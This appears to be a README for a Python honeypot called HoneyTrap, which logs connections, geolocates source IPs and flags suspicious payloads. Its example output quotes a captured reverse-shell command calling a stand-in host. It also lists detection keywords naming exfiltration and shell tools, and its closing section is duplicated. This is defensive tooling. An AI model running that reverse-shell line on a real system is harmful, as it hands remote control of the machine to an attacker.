HoneyTrap – Advanced Python Honeypot with Geolocation and Suspicious Payload Detection

HoneyTrap is an advanced Python-based TCP socket honeypot that listens for incoming connections, logs attacker data, detects suspicious payloads (like SQLi, RCE), and gathers geolocation information about the source IP. Logs are stored in both JSON and SQLite formats for long-term storage and analysis. It also supports basic fake responses to simulate a vulnerable environment and can be extended with dashboards or alerting systems.


---

🔧 Features

📡 TCP Socket Listener on a configurable port

🌍 Geolocation Lookup using ip-api.com

🚩 Suspicious Payload Detection (SQLi, RCE, LFI, etc.)

🧪 Fake System Command Prompt Response to bait attackers

📝 Logging in JSON & SQLite

🧰 Blacklist / Whitelist IP Filtering

🌈 Color-coded Real-time Logs via termcolor

🧱 Easily Extendable with Flask dashboards, alerts, etc.



---

🗂️ Project Structure

honeypot/
├── honeypot.py           # Honeypot main script
├── honeypot_logs.db      # SQLite log database
├── honeypot_logs.json    # JSON log file


---

📦 Installation

Install dependencies:

pip install requests termcolor


---

▶️ Usage

Run the honeypot:

python honeypot.py

It will:

Listen on all interfaces at port 9999

Log every incoming connection with IP, data, and location

Flag suspicious requests (like SQL injections or remote shell commands)

Save all data to both honeypot_logs.json and honeypot_logs.db

Respond to attackers with a fake Linux shell prompt message



---

🔍 Example Output

[STARTED] Honeypot listening on 0.0.0.0:9999

[NEW] 185.23.144.55:34231
 ↳ Location: Frankfurt, Germany | Org: Evil ISP
 ↳ Data: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
 ⚠ Suspicious activity detected!


---

📂 Log Format

JSON (honeypot_logs.json)

{
  "timestamp": "2025-06-23T18:40:10",
  "ip": "192.168.1.100",
  "port": 54321,
  "data": "curl example.com",
  "geo": {
    "country": "India",
    "city": "Mumbai",
    "org": "Jio"
  },
  "suspicious": true
}

SQLite (honeypot_logs.db)

TABLE logs (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    ip TEXT,
    port INTEGER,
    data TEXT,
    country TEXT,
    city TEXT,
    org TEXT,
    suspicious INTEGER
)


---

🧠 Detection Patterns

This honeypot detects:

SQL Injection: select, union, insert, etc.

Remote Code Execution: bash, sh, cmd, powershell

Local File Inclusion: ../, %2e%2e/

Recon/Exfil Tools: wget, curl, nc, telnet, etc.
HoneyTrap – Advanced Python Honeypot with Geolocation and Suspicious Payload Detection

    city TEXT,
    org TEXT,
    suspicious INTEGER
)


---

🧠 Detection Patterns

This honeypot detects:

SQL Injection: select, union, insert, etc.

Remote Code Execution: bash, sh, cmd, powershell

Local File Inclusion: ../, %2e%2e/

Recon/Exfil Tools: wget, curl, nc, telnet, etc.
